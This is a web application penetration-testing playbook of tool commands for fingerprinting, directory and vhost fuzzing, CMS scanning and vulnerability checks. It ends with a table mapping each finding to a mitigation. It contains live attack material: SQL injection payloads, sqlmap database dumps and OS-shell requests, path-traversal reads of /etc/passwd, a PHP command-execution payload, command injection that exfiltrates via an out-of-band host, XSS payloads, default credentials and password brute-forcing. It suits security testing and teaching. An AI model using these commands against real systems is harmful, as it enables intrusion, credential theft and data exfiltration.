# Web Enumeration Playbook

> Web applications are the most common attack surface. This playbook covers: technology fingerprinting, directory/file discovery, parameter fuzzing, vulnerability scanning, and authentication testing.

---

## 1. Technology Fingerprinting

```bash
# whatweb — fast tech stack identification
whatweb -v http://<target>               # verbose tech detection
whatweb -a 3 http://<target>            # aggression level 3 (more requests)

# wappalyzer CLI
npx wappalyzer http://<target>          # detect framework, CMS, server

# curl headers
curl -s -I http://<target>              # check Server, X-Powered-By, Set-Cookie headers
curl -s -I https://<target>             # TLS cert details
curl -sk https://<target>/ | head -50   # page source for meta generators, JS paths

# nuclei tech detection
nuclei -t technologies/ -target http://<target>
```

**Key headers to note:**
- `Server: Apache/2.4.29 (Ubuntu)` → version-specific CVE lookup
- `X-Powered-By: PHP/7.2.0` → PHP 7.2 EOL, check for known vulns
- `Set-Cookie: PHPSESSID` → PHP; `JSESSIONID` → Java; `ASP.NET_SessionId` → .NET
- `X-AspNet-Version` → ASP.NET version

---

## 2. SSL/TLS Analysis

```bash
# Certificate info (subjectAltName → hostnames!)
echo | openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'
openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -noout -dates -subject -issuer

# sslyze — TLS misconfiguration scanning
sslyze <target>:443 --heartbleed --robot --fallback --tlsv1 --tlsv1_1 --early_data

# testssl.sh — comprehensive
testssl.sh <target>:443

# sslscan
sslscan <target>:443
```

**Findings from TLS:**
- Subject Alternative Names → additional hostnames (virtual hosts)
- Weak ciphers (RC4, DES, 3DES, NULL) → CRITICAL
- TLS 1.0/1.1 enabled → Medium
- Self-signed cert → Medium (MITM possibility)
- Expired cert → Low/Info

---

## 3. Directory and File Discovery

### 3.1 gobuster (fast, reliable)
```bash
gobuster dir -u http://<target> \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,sql,conf \
  -t 50 -o gobuster_results.txt

# With auth
gobuster dir -u http://<target> -w <wordlist> -U admin -P password

# With custom headers (JWT, API key)
gobuster dir -u http://<target> -w <wordlist> -H "Authorization: Bearer <token>"

# HTTPS with insecure cert
gobuster dir -u https://<target> -w <wordlist> -k
```

### 3.2 ffuf (fast fuzzer — highly recommended)
```bash
# Basic dir fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -u http://<target>/FUZZ \
     -mc 200,204,301,302,307,403 \
     -t 100 -o ffuf_dirs.json -of json

# File fuzzing with extensions
ffuf -w <wordlist> -u http://<target>/FUZZ -e .php,.html,.txt,.bak,.zip,.sql,.old

# Filter by size (remove false positives)
ffuf -w <wordlist> -u http://<target>/FUZZ -fs 4095          # filter by size
ffuf -w <wordlist> -u http://<target>/FUZZ -fw 12            # filter by word count

# Vhost fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://<target>/ \
     -H "Host: FUZZ.<domain>" \
     -mc 200 -fs <baseline_size>   # filter default vhost response size
```

### 3.3 feroxbuster (recursive, Rust-based)
```bash
feroxbuster -u http://<target> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak -t 100 --auto-bail --filter-status 404

feroxbuster -u http://<target> --depth 3 --filter-size 0     # recursive, 3 levels deep
```

### 3.4 Wordlists to know
```bash
/usr/share/seclists/Discovery/Web-Content/
  directory-list-2.3-medium.txt      # classic, 220k entries
  raft-medium-directories.txt        # curated from real data
  raft-medium-words.txt
  big.txt                            # comprehensive
  common.txt                         # quick check
  api/api-endpoints.txt              # REST API paths
  api/objects.txt                    # REST nouns
SecLists/Discovery/Web-Content/swagger.txt   # OpenAPI/Swagger endpoints
```

---

## 4. Nikto — Automated Web Vulnerability Scanner

```bash
nikto -h http://<target>               # basic scan
nikto -h http://<target> -Tuning 1234567890abc   # full tuning (all checks)
nikto -h http://<target> -ssl          # force HTTPS
nikto -h http://<target> -id admin:password      # authenticated scan
nikto -h http://<target> -output nikto_out.txt -Format txt

# Tuning flags:
# 1 = Interesting File/Seen in logs
# 2 = Misconfiguration
# 3 = Information Disclosure
# 4 = Injection
# 5 = Remote File Retrieval
# 6 = Denial of Service
# 7 = Remote File Retrieval (server side)
# 8 = Command Execution / Remote Shell
# 9 = SQL Injection
# 0 = Upload
# a = Authentication Bypass
# b = Software Identification
# c = Remote Source Inclusion
```

---

## 5. Parameter and API Fuzzing

```bash
# GET parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://<target>/page.php?FUZZ=value" \
     -mc 200 -fw <baseline_words>

# POST parameter fuzzing
ffuf -w <wordlist> -u http://<target>/login \
     -X POST -d "FUZZ=value&other=val" \
     -H "Content-Type: application/x-www-form-urlencoded"

# JSON POST
ffuf -w <wordlist> -u http://<target>/api/v1/users \
     -X POST -d '{"FUZZ":"value"}' \
     -H "Content-Type: application/json"

# API version fuzzing
ffuf -w <wordlist> -u http://<target>/api/FUZZ/users -mc 200,401

# wfuzz
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      -u "http://<target>/page.php?file=FUZZ" --hc 404
```

---

## 6. CMS-Specific Enumeration

### WordPress
```bash
wpscan --url http://<target> --enumerate u,ap,at,tt,cb,dbe   # users, plugins, themes
wpscan --url http://<target> --passwords /usr/share/wordlists/rockyou.txt --usernames admin
wpscan --url http://<target> --enumerate vp --plugins-detection aggressive   # vulnerable plugins
# Check: /wp-json/wp/v2/users → user enumeration endpoint
curl http://<target>/wp-json/wp/v2/users | jq '.[].slug'
```

### Joomla
```bash
joomscan -u http://<target>
# Manual: /administrator, /.htaccess, /configuration.php~, /README.txt
```

### Drupal
```bash
droopescan scan drupal -u http://<target> -t 32
# Manual: /CHANGELOG.txt → version, /README.txt, /sites/default/settings.php
```

### Apache Tomcat
```bash
curl http://<target>:8080/                          # check for manager app
curl http://<target>:8080/manager/html             # Tomcat Manager (try admin:admin, tomcat:tomcat)
nmap --script http-tomcat-manager -p 8080 <target>
# Common creds: admin:admin, tomcat:tomcat, admin:password, role1:role1
```

---

## 7. Virtual Host (VHost) Discovery

```bash
# gobuster vhost mode
gobuster vhost -u http://<target> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 100

# ffuf vhost (compare response sizes)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://<IP>/ -H "Host: FUZZ.<domain>" -fs <default_size> -t 100

# Manual test:
curl -H "Host: dev.<domain>" http://<target>/
curl -H "Host: admin.<domain>" http://<target>/
curl -H "Host: test.<domain>" http://<target>/
curl -H "Host: staging.<domain>" http://<target>/
```

---

## 8. Common Vulnerability Testing

### SQLi Quick Check
```bash
# Manual payloads in URL/form parameters
# ' or 1=1--
# " or "1"="1
# ' or 1=1#
# 1' ORDER BY 1--

# sqlmap
sqlmap -u "http://<target>/page.php?id=1" --dbs        # enumerate databases
sqlmap -u "http://<target>/page.php?id=1" -D <db> --tables  # tables in db
sqlmap -u "http://<target>/page.php?id=1" -D <db> -T users --dump  # dump table
sqlmap -u "http://<target>/" --data="username=admin&password=test" --dbs  # POST
sqlmap -r request.txt --dbs                            # from Burp request file
sqlmap -u "http://<target>/?id=1" --os-shell           # try OS shell
```

### LFI / Path Traversal
```bash
# Test parameters: file, page, include, path, template, view
curl "http://<target>/page.php?file=../../../../../etc/passwd"
curl "http://<target>/page.php?file=....//....//....//etc/passwd"  # double encoding
curl "http://<target>/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "http://<target>/page.php?file=expect://id"       # expect wrapper → RCE
curl "http://<target>/page.php?file=php://input" -X POST -d '<?php system($_GET["cmd"]);?>'

# Windows targets
curl "http://<target>/page.php?file=..\\..\\..\\Windows\\win.ini"
curl "http://<target>/page.php?file=C:/Windows/win.ini"
```

### Command Injection
```bash
# Test in parameters that look like they interact with OS
# ;id, ;whoami, |id, &&id, `id`, $(id)
curl "http://<target>/ping.php?ip=127.0.0.1;id"
curl "http://<target>/ping.php?ip=127.0.0.1%3Bid"   # URL encoded

# Blind injection (time-based)
curl "http://<target>/ping.php?ip=127.0.0.1;sleep+5"  # 5s delay → confirmed
# Out-of-band: use Burp Collaborator or interactsh
curl "http://<target>/ping.php?ip=127.0.0.1;curl+http://<your_collaborator>/$(id)"
```

### XSS
```bash
# Reflected
curl "http://<target>/search.php?q=<script>alert(1)</script>"   # check if reflected unencoded
# Test with SVG, img onerror, etc. if script tags filtered:
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>

# Stored — submit payload in profile fields, comments, etc.
```

---

## 9. nuclei — Template-based Vuln Scanner

```bash
nuclei -t /opt/nuclei-templates/ -target http://<target> -o nuclei_results.txt
nuclei -t cves/ -target http://<target>           # only CVE templates
nuclei -t exposures/ -target http://<target>      # exposed config/files
nuclei -t vulnerabilities/ -target http://<target>
nuclei -t technologies/ -target http://<target>   # tech detection
nuclei -severity critical,high -target http://<target>   # high sev only
nuclei -t http/misconfiguration/ -target http://<target>  # misconfigurations

# Against a list of URLs
nuclei -l urls.txt -t cves/ -rate-limit 100 -bulk-size 50
```

---

## 10. Findings → Vulnerability Mapping

| Finding | Severity | OWASP | Mitigation |
|---------|----------|-------|------------|
| SQL Injection | Critical | A03:2021 | Parameterized queries / ORM; input validation |
| LFI / Path Traversal | Critical | A01:2021 | Whitelist allowed files; chroot/jail |
| Command Injection | Critical | A03:2021 | Avoid OS calls; whitelist input; sandbox |
| XSS (Stored) | High | A03:2021 | CSP; output encoding; HttpOnly cookies |
| Weak TLS (1.0/1.1, RC4) | High | A02:2021 | Enforce TLS 1.2+; disable weak ciphers |
| Directory listing | Medium | A05:2021 | Disable autoindex in web server config |
| Exposed admin interface | High | A05:2021 | Restrict by IP; require auth; move off /admin |
| Default credentials | Critical | A07:2021 | Change all defaults on deployment |
| Verbose error messages | Low | A05:2021 | Generic error pages; disable stack traces |
| Missing security headers | Low | A05:2021 | Add CSP, HSTS, X-Frame-Options, X-Content-Type |
| Exposed .git / .svn | High | A05:2021 | Block via webserver rule; gitignore |
